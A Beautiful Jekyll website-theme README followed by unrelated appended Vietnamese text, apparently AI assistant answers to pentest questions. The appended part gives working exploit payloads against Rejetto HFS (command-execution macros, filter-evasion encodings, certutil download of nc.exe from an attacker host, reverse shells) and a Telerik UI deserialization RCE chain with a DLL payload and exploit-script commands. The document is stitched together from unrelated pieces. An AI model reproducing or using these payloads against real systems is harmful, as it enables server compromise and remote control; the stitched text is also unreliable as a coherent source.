# Beautiful Jekyll

[![Gem Version](https://badge.fury.io/rb/beautiful-jekyll-theme.svg)](https://badge.fury.io/rb/beautiful-jekyll-theme)

> By [Dean Attali](https://deanattali.com) &middot; [Demo](https://beautifuljekyll.com/)

**Beautiful Jekyll** is a ready-to-use template to help you create a beautiful website quickly. Perfect for personal sites, blogs, or simple project websites.  [Check out a demo](https://beautifuljekyll.com) of what you'll get after just two minutes.  You can also look at [my personal website](https://deanattali.com) or [my consulting website](https://attalitech.com) to see it in use, or see [examples of websites](http://beautifuljekyll.com/examples) other people created using this theme.

**If you enjoy Beautiful Jekyll, please consider [supporting me](https://github.com/sponsors/daattali). You'll also gain access to office hours and more features! ❤**

## Table of contents

- [Features](#features)
- [Sponsors 🏆](#sponsors)
- [**Build your website in 3 steps**](#build-your-website-in-3-steps)
- [Plans](#plans)
- [Add your own content](#add-your-own-content)
- [Customizing parameters for each page](#customizing-parameters-for-each-page)
- [Supported parameters](#supported-parameters)
- [Featured users (success stories!)](#featured-users-success-stories)
- [Next steps](#next-steps)
- [Getting help](#getting-help)
- [Credits and contributions](#contributions)

# Features

__Check out [*What's New?*](https://beautifuljekyll.com/updates/) to see the latest features!__

- **SIMPLE**: The primary goal of Beautiful Jekyll is to allow literally *anyone* to create a website in a few minutes.
- **Modern**: Uses the latest best practices and technologies to achieve nearly perfect scores on Google Chrome's Audit.
- **Mobile-first**: Designed to look great on both large-screen and small-screen (mobile) devices.
- **Highly customizable**: Many personalization settings such as changing the background colour/image, adding a logo.
- **Flexible usage**: Use Beautiful Jekyll directly on GitHub or via a Ruby gem - choose the best [development method](#build-your-website-in-3-steps) for you.
- **Battle-tested**: By using Beautiful Jekyll, you'll be joining 50,000+ users enjoying this theme since 2015.
- **SEO and social media support**: Customize how your site looks on Google and when shared on social media.
- **Comments support**: Add comments to any page using either [Disqus](https://disqus.com/), [Facebook comments](https://developers.facebook.com/docs/plugins/comments), [Utterances](https://utteranc.es/), [Staticman](https://staticman.net), [giscus](https://giscus.app), or [CommentBox](https://commentbox.io/).
- **Tags**: Any blog post can be tagged with keywords, and an index page is automatically generated.
- **Analytics**: Easily integrate Google Analytics, or other analytics platforms, to track visits to your website.
- **Search**: Let users easily find any page using a Search button in the navigation bar.
- **Photos support**: Any page can have a full-width cover photo and thumbnail.
- **RSS**: An RSS feed is automatically created, so you can even host a podcast easily with Beautiful Jekyll.

<h2 id="sponsors">Sponsors 🏆</h2>

Developing and maintaining Beautiful Jekyll takes a lot of time and effort - thank you to anyone who helps fund this effort!

- [DoFollow](https://dofollow.co.uk/)

**[Become a sponsor for Beautiful Jekyll and unlock new features\!](https://github.com/sponsors/daattali/sponsorships?tier_id=39856)**

# Build your website in 3 steps

There are a few different ways to build a website using Beautiful Jekyll, and this document will go through the simplest one: using a fork on GitHub. For most people (including myself!), this easy method is the recommended one.

Even if you choose to use one of the [advanced installation methods](https://beautifuljekyll.com/getstarted/#install-steps-hard), I still suggest you read through the easy method first.

## The easy way (recommended!)

Getting started is *literally* as easy as 1-2-3 :smile:

Scroll down to see the steps involved, but here is a 30-second video just as a reference as you work through the steps. If you don't already have a [GitHub account](https://github.com), you'll need to sign up.

![Installation steps](https://beautifuljekyll.com/assets/img/install-steps.gif)

### 1. Fork this project

Click on the __*Fork*__ button at the top right corner of this page. Forking means that you're copying this entire project and all its files into your account. Do not click on the __*Create fork*__ button on the next page yet.

### 2. Rename the repository to `YOURUSERNAME.github.io`

You'll see the word "repository" used a lot in GitHub - it simply means "project". Under __*Repository name*__ you should see the name `beautiful-jekyll`, this is where you need to rename your project to `YOURUSERNAME.github.io` (replace `YOURUSERNAME` with your GitHub user name). It's important to use this exact name so that GitHub will recognize it and automatically create a website for this project.   

> Tip: If you want to use a different URL for your website, check out the [FAQ](https://beautifuljekyll.com/faq/#custom-domain)
 
### 3. Customize your website settings

Edit the `_config.yml` file to change any settings you want. To edit the file, first click on it to view the file, and on the next page click on the pencil icon to edit it (watch the video tutorial above if you're confused).  The settings in the file are self-explanatory and there are comments inside the file to help you understand what each setting does. Any line that begins with a hashtag (`#`) is a comment, and the other lines are actual settings. After changing the settings, click the green __*Commit changes*__ button to save these edits.

> Note: In the video above, only one setting in the `_config.yml` file is edited, but you should go through the rest of the settings as well.

### 4. Congratulations! You have a website!

If you named your project correctly and made an edit to the config file, your website should be ready in a minute or two at `https://YOURUSERNAME.github.io`. Every time you make a change to any file, your website will get rebuilt and should be updated in about a minute or so. Your website will be initialized with several sample blog posts and a couple other pages.

## The harder way (for advanced users)

The instructions above explain how to use Beautiful Jekyll in the easiest way: by forking on GitHub. There are more [advanced installation methods](https://beautifuljekyll.com/getstarted/#install-steps-hard) that include either using GitHub Pages with remote themes, or using Ruby gems. They provide you with more control, but are only intended for advanced users.

> Note: Beautiful Jekyll was primarily designed to be used as a GitHub theme, so you will not get any support if you use this theme via Ruby gems. 

# Plans

Beautiful Jekyll is, and always will be, free. But if you want to remove the Beautiful Jekyll ad from your website, use a Dark Mode skin, access office hours, or simply support the development efforts, [check out the different plans](https://beautifuljekyll.com/plans).

# Add your own content

To add pages to your site, you can either write a markdown file (`.md`) or you can write an HTML file. It's much easier to write markdown than HTML, so that's the recommended approach ([here's a great tutorial](https://markdowntutorial.com/) if you need to learn markdown in 5 minutes).

To see an example of a markdown file, click on any file that ends in `.md`, for example [`aboutme.md`](./aboutme.md). On that page you can see some nicely formatted text (there's a word in bold, a link, a few bullet points), and if you click on the pencil icon to edit the file, you'll see the markdown code that generated the pretty text. Very easy! 

In contrast, look at [`tags.html`](./tags.html). That's how your write HTML - not as pretty. So stick with markdown if you don't know HTML.

Any markdown or HTML file that you create will be available on your website under `https://<yourusername>.github.io/<pagename>`. For example, if you create a file `about.md` (or `about.html`) then it'll exist at `https://<yourusername>.github.io/about`.

Files you create inside the [`_posts`](./_posts) directory will be treated as blog entries. You can look at the existing files there to get an idea of how to write blog posts. Note the format of the blog post files - they must follow the naming convention of `YEAR-MONTH-DAY-title.md`. After you successfully add your own post, you can delete the existing files inside [`_posts`](./_posts) to remove the sample posts, as those are just demo posts to help you learn.

# Customizing parameters for each page

**One last important thing**: In order to have your new pages use this template and not just be plain HTML pages, **you must add [YAML front matter](https://jekyllrb.com/docs/front-matter/) to the top of each page**:


```
---
---
```

This is where you'll be able to give each page some extra parameters (such as a title, a subtitle, an image, etc - [below is a list of all parameters](#supported-parameters)). Add any parameters you want between these two dashed lines, for example:

```
---
title: Contact me
subtitle: Here you'll find all the ways to get in touch with me
---
```

If you don't want to use any parameters on a page, you still need to use the two dashed lines. If you don't, then your file will be shown as-is without the Beautiful Jekyll template.

You can look at the top of [`aboutme.md`](https://raw.githubusercontent.com/daattali/beautiful-jekyll/master/aboutme.md) as an example.

**Important takeaway: ALWAYS add the YAML front matter, which is two lines of three dashes, to EVERY page. If you have any parameters, they go between the two lines.**

# Supported parameters

Below is a list of the parameters that Beautiful Jekyll supports (any of these can be added to the YAML front matter of any page). Remember to also look in the `_config.yml` file to see additional site-wide settings. If there's a parameter that you want to apply to the entire site instead of one specific page, check out [this FAQ answer](https://beautifuljekyll.com/faq/#default-params).

## Main parameters

These are the basic YAML parameters that you are most likely to use on most pages.

Parameter   | Description
----------- | -----------
title       | Page or blog post title
subtitle    | Short description of page or blog post that goes under the title
tags        | List of tags to categorize the post. Separate the tags with commas and place them inside square brackets. Example: `[personal, analysis, finance]`
cover-img   | Include a large full-width image at the top of the page. You can either provide the path to a single image (eg. `"/path/to/img"`) , or a list of images to cycle through (eg. `["/path/img1", "/path/img2"]`). If you want to add a caption to an image, then you must use the list notation (use `[]` even if you have only one image), and each image should be provided as `"/path/to/img" : "Caption of image"`.
thumbnail-img | For blog posts, if you want to add a thumbnail that will show up in the feed, use `thumbnail-img: /path/to/image`. If no thumbnail is provided, then `cover-img` will be used as the thumbnail. You can use `thumbnail-img: ""` to disable a thumbnail.
comments    | If you want do add comments to a specific page, use `comments: true`. Comments only work if you enable one of the comments providers (Facebook, disqus, staticman, utterances, giscus, CommentBox) in `_config.yml` file. Comments are automatically enabled on blog posts but not on other pages; to turn comments off for a specific post, use `comments: false`.
mathjax     | If you want to use LaTeX formulas, you need to enable MathJax. Note that in MathJax you need to use `$$` and `\\(` to start and end expressions

## Parameters for SEO and social media sharing

These parameters let you control what information shows up when a page is shown in a search engine (such as Google) or gets shared on social media (such as Twitter/Facebook).

Parameter   | Description
----------- | -----------
share-title | A title for the page. If not provided, then `title` will be used, and if that's missing then the site title (from `_config.yml`) is used.
share-description | A brief description of the page. If not provided, then `subtitle` will be used, and if that's missing then an excerpt from the page content is used.
share-img   | The image to show. If not provided, then `cover-img` or `thumbnail-img` will be used if one of them is provided.

## Less commonly used parameters

These are parameters that you may not use often, but can come in handy sometimes.

Parameter   | Description
----------- | -----------
author      | Specify the author of a blog post (useful if a website has multiple authors).
readtime    | If you want a post to show how many minutes it will take to read it, use `readtime: true`.
show-avatar | If you have an avatar configured in the `_config.yml` but you want to turn it off on a specific page, use `show-avatar: false`.
social-share | By default, every blog post has buttons to share the page on social media. If you want to turn this feature off, use `social-share: false`.
nav-short   | By default, the navigation bar gets shorter after scrolling down the page. If you want the navigation bar to always be short on a certain page, use `nav-short: true`
gh-repo   | If you want to show GitHub buttons at the top of a post, this sets the GitHub repo name (eg. `daattali/beautiful-jekyll`). You must also use the `gh-badge` parameter to specify what buttons to show.
gh-badge  | Select which GitHub buttons to display. Available options are: [star, watch, fork, follow]. You must also use the `gh-repo` parameter to specify the GitHub repo.
last-updated | If you want to show that a blog post was updated after it was originally released, you can specify an "Updated on" date.
layout      | What type of page this is (default is `post` for blog posts and `page` for other pages). See _Page types_ section below for more information.

## Advanced parameters

These are advanced parameters that are only useful for people who need very fine control over their website.

Parameter   | Description
----------- | -----------
footer-extra | If you want to include extra content below the social media icons in the footer, create an HTML file in the `_includes/` folder (for example `_includes/myinfo.html`) and set `footer-extra` to the name of the file (for example `footer-extra: myinfo.html`). Accepts a single file or a list of files.
before-content | Similar to `footer-extra`, but used for including HTML before the main content of the page (below the title).
after-content | Similar to `footer-extra`, but used for including HTML after the main content of the page (above the footer).
head-extra   | Similar to `footer-extra`, but used if you have any HTML code that needs to be included in the `<head>` tag of the page.
language    | HTML language code to be set on the page's &lt;html&gt; element.
full-width  | By default, page content is constrained to a standard width. Use `full-width: true` to allow the content to span the entire width of the window.
js          | List of local JavaScript files to include in the page (eg. `/assets/js/mypage.js`)
ext-js      | List of external JavaScript files to include in the page (eg. `//cdnjs.cloudflare.com/ajax/libs/underscore.js/1.8.2/underscore-min.js`). External JavaScript files that support [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) can be specified using the `href` and `sri` parameters eg.<br/>`href: "//code.jquery.com/jquery-3.1.1.min.js"`<br/>`sri: "sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="`
css         | List of local CSS files to include in the page
ext-css      | List of external CSS files to include in the page. External CSS files using SRI (see `ext-js` parameter) are also supported.

## Page types

- **post** - To write a blog post, add a markdown or HTML file in the `_posts` folder. As long as you give it YAML front matter (the two lines of three dashes), it will automatically be rendered like a blog post. Look at the existing blog post files to see examples of how to use YAML parameters in blog posts.
- **page** - Any page outside the `_posts` folder that uses YAML front matter will have a very similar style to blog posts.
- **home** - The home layout is meant to act as the homepage of your blog posts - it will display all your blog posts, sorted from newest to oldest. A file using the `home` layout must be named `index.html` (not `index.md` or anything else!).
- **minimal** - If you want to create a page with minimal styling (ie. without the bulky navigation bar and footer), assign `layout: minimal` to the YAML front matter.
- If you want to completely bypass the template engine and just write your own HTML page, simply omit the YAML front matter. Only do this if you know how to write HTML!

# Featured users (success stories!)

Visit the [Official website](http://beautifuljekyll.com/examples) to see sample websites using Beautiful Jekyll.

If you'd like to showcase yourself and join this list, [upgrading to the Individual plan](https://github.com/sponsors/daattali/sponsorships?&tier_id=7362) will give you that publicity plus some other rewards!

# Next steps

Congratulations on making it this far! You now have all the tools to easily build a beautiful website for free. 

- After you get comfortable with the basics of writing in markdown, I suggest taking a look at this [sample post](https://beautifuljekyll.com/2020-02-28-sample-markdown/) and [the code that created it](https://raw.githubusercontent.com/daattali/beautiful-jekyll/master/_posts/2020-02-28-sample-markdown.md) to learn some more advanced tips about markdown.

- I **highly recommend** going over the [*Frequently Asked Questions*](https://beautifuljekyll.com/faq/) to find out answers to questions you may not even know you have. Every few months I suggest checking the [*What's New?*](https://beautifuljekyll.com/updates/) page to see if there are new features, and learn [how to update your site to the newest version](https://beautifuljekyll.com/faq/#updating) when it's time.

- You can also check out the [advanced installation methods](https://beautifuljekyll.com/getstarted/#install-steps-hard) that give you a little more control but are harder to use. Keep in mind that Beautiful Jekyll was primarily designed to be used as a GitHub theme, so you will not get any support if you choose one of the Ruby installation methods. 

- Remember that Beautiful Jekyll is built on top of Jekyll. This means that reading through the [Jekyll documentation](https://jekyllrb.com/) will introduce you to many more features that you might find useful!

# Getting help

Visit the [FAQ page](https://beautifuljekyll.com/faq) for answers to commonly asked questions.

**If you choose to [become a sponsor](https://beautifuljekyll.com/plans/), you'll have access to my [office hours](https://beautifuljekyll.com/officehours/) where you can ask for help.** You can also use the [Discussions](https://github.com/daattali/beautiful-jekyll/discussions) area to try and get help from the community.

Beautiful Jekyll is used by 50,000+ people with wildly varying degrees of web skills, so it's impossible to answer all the questions that may arise. For any question that's not specifically related to Beautiful Jekyll and is more about Jekyll or web development in general, the answer can often be found on Google, in the [Jekyll documentation](https://jekyllrb.com/), or on the [Jekyll support forum](https://talk.jekyllrb.com/).

# Contributions

Thank you to [all past contributors](https://github.com/daattali/beautiful-jekyll/graphs/contributors). If you find any problems or would like to contribute in any way, feel free to create a pull request/open an issue/send me a message.

You can also contribute by becoming an [official sponsor](https://github.com/sponsors/daattali/sponsorships?tier_id=39856) to help keep Beautiful Jekyll well-maintained!

# Credits

This template was not made *entirely* from scratch. I'd like to give special thanks to [Jekyll Now](https://github.com/barryclark/jekyll-now) and [Bootstrap Clean Blog](https://github.com/IronSummitMedia/startbootstrap-clean-blog), from whom I've taken several ideas initially.
để tìm ra chính xác CVE dựa vào hành vi thực tế (Behavior-based/Black-box pentest) của máy chủ Rejetto HFS 2.3 trong môi trường lab mà không chỉ dựa vào việc quét phiên bản (Banner grabbing vốn dễ bị sai nếu admin đổi tên), bạn cần thực hiện theo quy trình thực nghiệm dưới đây.
Phương pháp chính xác nhất là gửi payload kiểm thử không phá hủy (Non-destructive PoC) và quan sát phản hồi từ server (về mặt thời gian, mã lỗi, hoặc lưu lượng mạng).

Bước 1: Xác định cấu trúc URL đặc trưng của HFS 2.x

Trước khi khai thác, bạn cần xác nhận server mục tiêu thực sự chạy mã nguồn HFS 2.3 thông qua cấu trúc web:
• Truy cập http://<IP_Server>:<Port>/
• Xem Source Code (F12) tìm các chuỗi đặc trưng: href="http://rejetto.com", id="hfsmenu", hoặc các hàm JavaScript xử lý các macro như [box], [files].

Bước 2: Pentest tìm CVE-2024-23692 (Template Injection RCE)

Hành vi thực tế của lỗ hổng này là máy chủ sẽ thực thi cú pháp macro của HFS nằm trong URL hoặc tham số và trả về kết quả ngay trên giao diện web hoặc làm chậm tiến trình.
Cách pentest chính xác nhất (Blind/Time-based hoặc Response-based):
1. Sử dụng payload tính toán (Response-based):
Gửi một yêu cầu HTTP GET với macro thực hiện phép tính để xem server có trả về kết quả không:http
GET /?search==%7B%2B%7C1%7C1%7D HTTP/1.1
Host: <IP_Server>
Hãy thận trọng khi sử dụng mã.
(Trong đó %7B%2B%7C1%7C1%7D là URL encode của {|+|1|1}).
	• Hành vi xác nhận tổn thương: Nếu phản hồi từ server (HTTP Response) hiển thị số 2 ở vị trí tìm kiếm hoặc trong source code, server chắc chắn dính lỗ hổng này.
2. Sử dụng lệnh trì hoãn (Time-based):
Nếu cấu hình server ẩn kết quả, hãy ép server chạy lệnh ping hoặc sleep:http
GET /?search=%7B.exec%7Cping%20-n%205%20127.0.0.1.%7D HTTP/1.1
Host: <IP_Server>
Hãy thận trọng khi sử dụng mã.

	• Hành vi xác nhận tổn thương: Thời gian phản hồi từ server (Response Time) bị trễ khoảng 5 giây so với các request thông thường.

Bước 3: Pentest tìm CVE-2014-6287 (Null Byte Parser Bypass RCE)

Lỗ hổng này đặc trưng bởi việc bộ lọc của các phiên bản cũ bị bẻ gãy khi gặp ký tự Null Byte (%00).
Cách pentest chính xác nhất:
1. Gửi payload chèn macro thực thi lệnh thông qua tham số tìm kiếm kết hợp ký tự %00:http
GET /?search=%00%7B.exec%7Ccmd.exe%20/c%20ping%20-n%205%20127.0.0.1.%7D HTTP/1.1
Host: <IP_Server>
Hãy thận trọng khi sử dụng mã.
(Chuỗi chưa mã hóa là: /?search=%00{.exec|cmd.exe /c ping -n 5 127.0.0.1.})
2. Hành vi xác nhận tổn thương:
	• Máy chủ phản hồi trễ 5 giây.
	• Nếu bạn bật Task Manager trên máy chủ lab (Windows), bạn sẽ thấy tiến trình cmd.exe và ping.exe được sinh ra dưới dạng tiến trình con của hfs.exe.

Bước 4: Kiểm thử bằng phương thức Out-of-Band (OAST) - Khuyên dùng trong Lab

Để xác định chuẩn xác nhất mà không cần nhìn vào màn hình server lab, hãy dựng một máy chủ lắng nghe (ví dụ: máy Kali Linux chạy nc -lvnp 4444 hoặc dùng Burp Suite Collaborator).
1. Gửi payload bắt HFS kết nối ngược về máy bạn:http
GET /?search=%7B.exec%7Ccmd.exe%20/c%20curl%20http://<IP_Kali>:<Port_nc>/%7D HTTP/1.1
Hãy thận trọng khi sử dụng mã.
2. Hành vi xác nhận: Nếu trên máy Kali nhận được một kết nối HTTP đến từ IP của server HFS, điều đó chứng tỏ lệnh RCE đã thực thi thành công hoàn toàn.

Bảng đối chiếu hành vi thực tế để phân biệt 2 CVE


Hành vi kiểm thử	Kết quả của CVE-2014-6287	Kết quả của CVE-2024-23692
Gửi payload có %00 (Null byte)	Thành công (Lệnh thực thi)	Thành công (Do bản chất vẫn nhận macro)
Gửi payload không có %00 (Chỉ có {...})	Thất bại (Bị bộ lọc chặn, trả về trang tìm kiếm rỗng)	Thành công (Vượt qua bộ lọc dễ dàng)

Mẹo thu hẹp mục tiêu: Nếu bạn gửi payload không chứa %00 mà server vẫn thực thi lệnh (hoặc tính toán ra kết quả), server của bạn đang chạy phiên bản bị dính CVE-2024-23692 (phiên bản cao hơn như 2.3m). Nếu bắt buộc phải có %00 mới chạy được, server đang dính CVE-2014-6287 (phiên bản rất cũ < 2.3c).
Để hỗ trợ bạn tốt nhất trong lab, bạn có thể cho tôi biết:
• Bạn đang dùng công cụ nào để bắt và sửa gói tin (ví dụ: Burp Suite, Python script, hay Metasploit)?
• Hệ điều hành của máy chủ HFS trong lab là Windows hay chạy qua Wine trên Linux?
Từ đó tôi có thể cung cấp đoạn script test tự động hoặc câu lệnh chính xác cho môi trường của bạn.

Để giúp bạn thực hiện pentest chuyên sâu trong lab, dưới đây là danh mục các biến thể payload nâng cao (phòng trường hợp server cấu hình WAF hoặc filter lạ) và workflow (quy trình xử lý) chi tiết từng bước cho cả 2 kịch bản thành công và thất bại.

PHẦN 1: CÁC BIẾN THỂ PAYLOAD (EVASION & ALTERNATIVES)

Nếu các payload cơ bản ở lượt trước bị chặn hoặc không phản hồi, hãy thử các biến thể cấu trúc macro của HFS dưới đây:

1. Biến thể bypass bộ lọc ký tự bằng cách chia nhỏ chuỗi (String Concatenation)

HFS cho phép ghép chuỗi bằng macro {.^.}. Nếu từ khóa cmd hoặc exec bị tường lửa chặn, bạn có thể cắt nhỏ chúng:
• Payload: /?search={.%65xec|c%6dd.exe /c ping -n 5 127.0.0.1.}
• Hoặc dùng macro ghép: /?search={.exec|{.^c.}md.exe /c ping -n 5 127.0.0.1.}

2. Biến thể sử dụng các Macro hệ thống khác thay vì {.exec.}

Nếu {.exec.} bị vô hiệu hóa hoặc bị lọc, HFS 2.3 còn hỗ trợ các macro tương tác file/hệ thống khác:
• Đọc file cấu hình hệ thống (Response-based):
/?search={.load|C:\Windows\win.ini.} (Nếu thành công, nội dung file win.ini sẽ in ra ngay trên giao diện web).
• Lấy thông tin phiên bản HFS nội bộ:
/?search={.version.} hoặc /?search={.g|version.}

3. Biến thể Encode nâng cao (Dành cho CVE-2024-23692)

Đôi khi việc gửi trực tiếp dấu ngoặc nhọn {} trong URL bị máy chủ HTTP trả về lỗi 400 Bad Request. Bạn cần thử các kiểu encode:
• Double URL Encode (Vượt qua WAF/Reverse Proxy đứng trước HFS):
	• Dấu { chuyển thành %257B
	• Dấu } chuyển thành %257D
	• Dấu | chuyển thành %257C
	• Payload: /?search=%257B.exec%257Cping%2520-n%25205%2520127.0.0.1.%257D

PHẦN 2: WORKFLOW CHI TIẾT CHO PENTESTER

Dưới đây là sơ đồ tư duy hành động (Playbook) khi bạn tiến hành test trong Lab bằng Burp Suite hoặc Python.

Kịch bản A: KHI KHÔNG THÀNH CÔNG (Payload bị từ chối / Không có hành vi lạ)

Khi bạn gửi payload mà server phản hồi bình thường lập tức, hoặc trả về lỗi, hãy làm theo workflow sau:
[Gửi Payload] ──> Không có phản hồi trễ / Không thực thi
    │
    ├──> Bước A1: Kiểm tra mã HTTP phản hồi (Status Code)
    │     ├──> Lỗi 400 Bad Request: Server không nhận ký tự đặc biệt ({, |, %).
    │     │    └──> HÀNH ĐỘNG: Chuyển sang dùng Double URL Encode (Phần 1.3).
    │     │
    │     ├──> Lỗi 403 Forbidden / 406 Not Acceptable: Bị WAF hoặc cơ chế bảo vệ chặn.
    │     │    └──> HÀNH ĐỘNG: Áp dụng các biến thể chia nhỏ chuỗi (Phần 1.1) hoặc đổi tham số sang `?S=` thay vì `?search=`.
    │     │
    │     └──> Mã 200 OK nhưng trang web hiển thị bình thường.
    │          └──> HÀNH ĐỘNG: Chuyển sang Bước A2.
    │
    ├──> Bước A2: Xác định lại cơ chế (Null Byte check)
    │     └──> Có thể server thuộc nhóm CVE-2014-6287 (yêu cầu nghiêm ngặt ký tự Null).
    │          └──> HÀNH ĐỘNG: Chèn thêm `%00` vào trước `{` ở TẤT CẢ các biến thể trên.
    │
    └──> Bước A3: Kiểm tra quyền thực thi lệnh trên Windows Lab
          └──> Có thể lệnh chạy được nhưng quyền User chạy HFS bị giới hạn (không gọi được `cmd.exe`).
               └──> HÀNH ĐỘNG: Thử payload đọc file `{.load|C:\windows\win.ini.}` để xem đó là lỗi "chặn RCE" hay lỗi "chặn thực thi tiến trình con".

Kịch bản B: KHI THÀNH CÔNG (Xác nhận có lỗ hổng)

Khi bạn thấy Server bị trễ (Time-based thành công) hoặc trả về số 2 / nội dung file win.ini (Response-based thành công), mục tiêu tiếp theo trong lab là Khai thác mở rộng (Post-Exploitation) an toàn.
[Xác nhận Vuln] ──> Server dính lỗ hổng bảo mật
    │
    ├──> Bước B1: Kiểm tra đặc quyền (Privilege Check)
    │     └──> Gửi payload ghi một file text vào thư mục web công khai để xem quyền ghi:
    │          `/?search={.save|test.txt|Vuln-Confirmed.}`
    │     └──> Truy cập `http://<IP_Server>:<Port>/test.txt`. 
    │          Nếu đọc được chữ "Vuln-Confirmed", bạn có quyền Ghi (Write access).
    │
    ├──> Bước B2: Độc lập hóa tiến trình (Tối ưu hóa Lab)
    │     └──> Tránh việc chạy lệnh làm treo service `hfs.exe`.
    │     └──> HÀNH ĐỘNG: Khi gọi lệnh Windows, luôn thêm `start /b` hoặc `cmd /c` để lệnh chạy ngầm ở background, không chiếm dụng thread của web server.
    │
    └──> Bước B3: Nâng cấp lên Reverse Shell (Chiếm quyền điều khiển trong lab)
          ├──> Cách 1 (Dùng PowerShell mã hóa Base64 để tránh lỗi ký tự):
          │    `/?search={.exec|powershell.exe -e <MÃ_BASE64_REVERSE_SHELL>.}`
          └──> Cách 2 (Tải file mã độc test từ máy Kali về chạy):
               `/?search={.exec|cmd.exe /c certutil.exe -urlcache -f http://<IP_Kali>/nc.exe C:\Windows\Temp\nc.exe.}`
               Sau đó kích hoạt: `/?search={.exec|C:\Windows\Temp\nc.exe <IP_Kali> <Port> -e cmd.exe.}`

Mẹo quan sát trực quan nhất trong Lab:

Nếu bạn có quyền điều khiển màn hình máy Target (Windows), hãy bật công cụ Process Hacker hoặc Process Explorer. Khi bạn gửi payload thành công, bạn sẽ thấy tiến trình hfs.exe đẻ ra một tiến trình con là cmd.exe hoặc powershell.exe. Nếu thấy chúng xuất hiện rồi biến mất (hoặc chạy ngầm), bạn đã pentest thành công 100% dựa trên hành vi thực tế.
Trong lab của bạn, mục tiêu cuối cùng của bạn là chỉ dừng lại ở mức chứng minh lỗ hổng (PoC) hay muốn leo thang đặc quyền / lấy Reverse Shell thành công? Nếu cần, tôi có thể cung cấp đoạn đóng gói mã hóa Base64 PowerShell tương thích hoàn toàn với cấu trúc macro của HFS để bạn test shell.

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
Phiên bản Telerik UI for ASP.NET AJAX 2013.2.717.40 tích hợp trên nền tảng DotNetNuke (DNN) của bạn đang bị ảnh hưởng bởi chuỗi 3 lỗ hổng bảo mật nghiêm trọng: [1] (https://securitybox.vn/8039/mot-so-lo-hong-bao-mat-nghiem-trong-tren-telerik-ui-for-asp-net-ajax/)
1. CVE-2017-9248: Rò rỉ khóa mã hóa qua tấn công Brute-force/Padding Oracle.
2. CVE-2017-11317: Tải lên file tùy ý (Arbitrary File Upload) do cơ chế mã hóa yếu.
3. CVE-2019-18935: Thực thi mã từ xa (RCE) thông qua Deserialization không an toàn. [1] (https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui), [2] (https://securitybox.vn/8039/mot-so-lo-hong-bao-mat-nghiem-trong-tren-telerik-ui-for-asp-net-ajax/)
Dưới đây là các kịch bản và payload thực tế được cấu trúc để bạn thực hiện kiểm thử xâm nhập (Penetration Testing) nhằm chứng minh lỗ hổng cho hệ thống này.

Bước 1: Thu thập thông tin & Xác định Endpoint

Thành phần RadAsyncUpload của Telerik thường đăng ký một HTTP Handler nhận diện mục tiêu. Bạn cần kiểm tra xem đường dẫn sau có tồn tại và trả về phản hồi từ Telerik hay không:
• URL mục tiêu: http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau [1] (https://www.exploit-db.com/exploits/47793)

Bước 2: Khai thác CVE-2017-9248 (Dò tìm mã khóa - Khởi đầu chuỗi RCE)

Để tải file lên hoặc kích hoạt deserialization, bạn cần biết khóa Telerik.Web.UI.DialogParametersEncryptionKey. Với phiên bản 2013, khóa này có thể được dò tìm tự động bằng các công cụ mã nguồn mở. [1] (https://securitybox.vn/8039/mot-so-lo-hong-bao-mat-nghiem-trong-tren-telerik-ui-for-asp-net-ajax/)
• Sử dụng Tool khôi phục Key: Bạn có thể dùng script Python telerik-decrypt của bao7uo để thực hiện gửi các request liên tiếp và bẻ khóa qua phản hồi khác biệt của server:bash
python telerik-decrypt.py -u "http://<target>/Telerik.Web.UI.WebResource.axd?type=rau" -v 2013.2.717.40
Hãy thận trọng khi sử dụng mã.
• Kết quả thu được: Một chuỗi Hex đại diện cho Key mã hóa của hệ thống (Ví dụ: C0DE...).

Bước 3: Chứng minh CVE-2017-11317 & CVE-2019-18935 (Khai thác RCE)

Khi đã có Key từ Bước 2, bạn có thể thực hiện tải lên một file DLL bất hợp pháp và kích hoạt tính năng giải tuần tự hóa (JavaScriptSerializer) của Telerik để ép tiến trình w3wp.exe nạp thư viện này vào bộ nhớ. [1] (https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/common-allows-javascriptserializer-deserialization), [2] (https://www.exploit-db.com/exploits/47793)

1. Tạo Payload DLL (Proof of Concept - Sleep Test)

Sử dụng mã nguồn C# để biên dịch một file DLL hỗn hợp (Mixed-mode Assembly). Để chứng minh RCE an toàn, hãy sử dụng hàm Sleep thay vì chạy lệnh hệ thống:
csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Threading;

[RunInstaller(true)]
public class Exploit : Installer
{
    public override void Install(System.Collections.IDictionary stateSaver)
    {
        base.Install(stateSaver);
        // Khiến luồng xử lý của server dừng 10 giây để chứng minh code đã chạy
        Thread.Sleep(10000); 
    }
}
Hãy thận trọng khi sử dụng mã.
Biên dịch file này thành một tệp có tên poc.dll.

2. Cấu trúc Payload POST Request (Kích hoạt RCE)

Để gửi tệp và kích hoạt thực thi, bạn cần gửi một request POST dạng JSON (sau đó được mã hóa bằng Key tìm được ở Bước 2) tới endpoint. [1] (https://www.exploit-db.com/exploits/47793)
Cấu trúc đối tượng JSON gốc chưa mã hóa của tham số rauPostData sẽ tương tự như sau:
json
{
    "Path": "C:\\Windows\\Temp\\poc.dll",
    "TargetFolder": "C:\\Windows\\Temp\\",
    "TempTargetFolder": "C:\\Windows\\Temp\\",
    "AsyncUploadTypeName": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
    "Content": "BASE64_CHUOI_NHI_PHAN_CUA_FILE_POC.DLL_TAI_DAY"
}
Hãy thận trọng khi sử dụng mã.
• Công cụ hỗ trợ đóng gói tự động: Bạn nên sử dụng exploit script CVE-2019-18935 trên GitHub của noperator để tự động hóa việc mã hóa cấu trúc này. [1] (https://gist.github.com/ripp3rdoc/46e0309b8677876417743a87b103e49e)
bash
python cve-2019-18935.py -u http://<target>/Telerik.Web.UI.WebResource.axd?type=rau -p poc.dll -v 2013.2.717.40 -k <KEY_TIM_DUOC_O_BUOC_2>
Hãy thận trọng khi sử dụng mã.
• Dấu hiệu chứng minh thành công:
	• Máy chủ mất chính xác hơn 10 giây (hoặc thời gian bạn cấu hình trong Thread.Sleep) mới phản hồi lại request HTTP POST.
